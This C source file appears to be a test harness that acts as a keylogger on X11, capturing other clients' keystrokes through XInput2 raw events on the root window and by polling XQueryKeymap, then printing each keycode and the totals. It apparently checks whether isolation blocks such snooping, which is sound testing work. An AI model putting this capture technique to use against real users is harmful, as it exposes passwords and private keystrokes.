/* xspy.c - TEST TOOL: the attack. An ordinary X11 client that tries to read keys it does not own,
 * two ways, like a keylogger would: XInput2 raw key events on the root window, and polling XQueryKeymap.
 * Prints one line per key it sees; at exit prints the counts.
 * Runs until stdin closes. */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <X11/Xlib.h>
#include <X11/extensions/XInput2.h>

int main(void)
{
	Display *d = XOpenDisplay(NULL);
	if (!d) return 2;
	int op, ev, er;
	if (!XQueryExtension(d, "XInputExtension", &op, &ev, &er)) return 2;
	int rmaj = 2, rmin = 0;
	XIQueryVersion(d, &rmaj, &rmin);
	unsigned char mask[XIMaskLen(XI_LASTEVENT)] = { 0 };
	XISetMask(mask, XI_RawKeyPress);
	XIEventMask em = { XIAllMasterDevices, sizeof mask, mask };
	XISelectEvents(d, DefaultRootWindow(d), &em, 1);
	XFlush(d);
	int rop, rev, rer, have_rec = XQueryExtension(d, "RECORD", &rop, &rev, &rer);
	printf("spy up xi2=%d.%d record-ext=%s (not exercised: no libXtst headers here)\n", rmaj, rmin, have_rec ? "present" : "absent"); fflush(stdout);
	int raw = 0, keymap = 0;
	char old[32], cur[32];
	XQueryKeymap(d, old);
	struct pollfd p = { 0, POLLIN, 0 };
	int xfd = ConnectionNumber(d);
	(void)xfd;
	for (;;) {
		while (XPending(d)) {
			XEvent e; XNextEvent(d, &e);
			if (e.xcookie.type == GenericEvent && e.xcookie.extension == op && XGetEventData(d, &e.xcookie)) {
				if (e.xcookie.evtype == XI_RawKeyPress) { raw++; XIRawEvent *r = e.xcookie.data; printf("raw press keycode=%d\n", r->detail); fflush(stdout); }
				XFreeEventData(d, &e.xcookie);
			}
		}
		XQueryKeymap(d, cur);
		for (int i = 0; i < 32; i++) if (cur[i] != old[i]) {
			for (int b = 0; b < 8; b++) if ((cur[i] ^ old[i]) & (1 << b) & cur[i]) { keymap++; printf("keymap press keycode=%d\n", i * 8 + b); fflush(stdout); }
			old[i] = cur[i];
		}
		if (poll(&p, 1, 10) > 0 && (p.revents & (POLLIN | POLLHUP))) { char c; if (read(0, &c, 1) <= 0) break; }
	}
	printf("TOTAL raw=%d keymap=%d\n", raw, keymap);
	return 0;
}
